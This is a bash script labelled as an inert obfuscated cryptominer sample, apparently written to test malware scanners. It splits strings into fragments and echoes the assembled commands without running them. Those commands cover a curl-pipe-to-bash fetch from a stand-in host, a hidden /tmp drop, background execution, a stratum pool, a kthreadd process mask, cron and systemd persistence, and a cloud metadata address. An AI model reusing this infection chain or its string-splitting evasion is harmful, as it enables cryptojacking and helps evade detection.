#!/bin/bash
# ============================================================
# OBFUSCATED SAMPLE MINER PAYLOAD (INERT)
# FOR ML / SECURITY SCANNING ONLY
# DO NOT EXECUTE
# ============================================================

# ---------------------------
# Stage 1: Obfuscated Strings
# ---------------------------

a1="cu"
a2="rl"
a3=" -f"
a4="sSL"
a5=" http://exa"
a6="mple.com/"
a7="x | ba"
a8="sh"

OBF_DL="$a1$a2$a3$a4$a5$a6$a7$a8"

echo "decoded_delivery=$OBF_DL"

# ---------------------------
# Stage 2: Hidden Drop Path
# ---------------------------

d1="/t"
d2="mp"
d3="/."
d4="x"

DROP_PATH="$d1$d2$d3$d4"
echo "drop_path=$DROP_PATH"

# ---------------------------
# Stage 3: Obfuscated Execution
# ---------------------------

e1="ch"
e2="mod"
e3=" +"
e4="x "
e5="$DROP_PATH"

EXEC_PERM="$e1$e2$e3$e4$e5"
echo "exec_perm=$EXEC_PERM"

bg1="no"
bg2="hu"
bg3="p "
bg4="$DROP_PATH"
bg5=" &"

EXEC_BG="$bg1$bg2$bg3$bg4$bg5"
echo "background_exec=$EXEC_BG"

# ---------------------------
# Stage 4: Mining Config (Split)
# ---------------------------

m1="--al"
m2="go="
m3="rx"
m4="/0"

ALGO="$m1$m2$m3$m4"

p1="str"
p2="atu"
p3="m+"
p4="tcp"
p5="://"
p6="pool."
p7="exa"
p8="mple"
p9=":3333"

POOL="$p1$p2$p3$p4$p5$p6$p7$p8$p9"

echo "mining_flags=$ALGO $POOL"

# ---------------------------
# Stage 5: Wallet Obfuscation
# ---------------------------

w1="WAL"
w2="LET"
w3="_ID"

WALLET="$w1$w2$w3"
echo "wallet=$WALLET"

# ---------------------------
# Stage 6: Stealth Patterns
# ---------------------------

s1=">/"
s2="dev"
s3="/nu"
s4="ll"
s5=" 2>&1"

STEALTH_OUT="$s1$s2$s3$s4$s5"
echo "stealth_redirect=$STEALTH_OUT"

pn1="ex"
pn2="ec"
pn3=" -a "
pn4="kth"
pn5="re"
pn6="add"

PROC_NAME="$pn1$pn2$pn3$pn4$pn5$pn6"
echo "proc_mask=$PROC_NAME"

# ---------------------------
# Stage 7: Persistence (Hidden)
# ---------------------------

c1="*/"
c2="10 "
c3="* *"
c4=" * "
c5="$DROP_PATH"

CRON_JOB="$c1$c2$c3$c4$c5"
echo "cron_pattern=$CRON_JOB"

sd1="sys"
sd2="tem"
sd3="ctl "
sd4="ena"
sd5="ble "
sd6="sys"
sd7="-up"
sd8="date"

SYSTEMD="$sd1$sd2$sd3$sd4$sd5$sd6$sd7$sd8"
echo "systemd_action=$SYSTEMD"

# ---------------------------
# Stage 8: Environment Awareness
# ---------------------------

env1="/."
env2="dock"
env3="erenv"

DOCKER_ENV="$env1$env2$env3"
echo "env_check=$DOCKER_ENV"

meta1="169."
meta2="254."
meta3="169."
meta4="254"

META_IP="$meta1$meta2$meta3$meta4"
echo "cloud_meta_ip=$META_IP"

# ---------------------------
# Stage 9: Obfuscation Layers
# ---------------------------

b64="YmFzaCAtYyB4bQ=="
echo "base64_blob=$b64"

aes1="open"
aes2="ssl "
aes3="enc "
aes4="-aes-256-cbc"

AES_CMD="$aes1$aes2$aes3$aes4"
echo "crypto_layer=$AES_CMD"

# ---------------------------
# Stage 10: Watchdog Logic
# ---------------------------

wd1="wh"
wd2="ile"
wd3=" true;"
wd4=" do "
wd5="sleep "
wd6="5;"
wd7=" done"

WATCHDOG="$wd1$wd2$wd3$wd4$wd5$wd6$wd7"
echo "watchdog_loop=$WATCHDOG"

# ---------------------------
# End Marker
# ---------------------------

echo "obfuscated miner payload loaded (safe)"
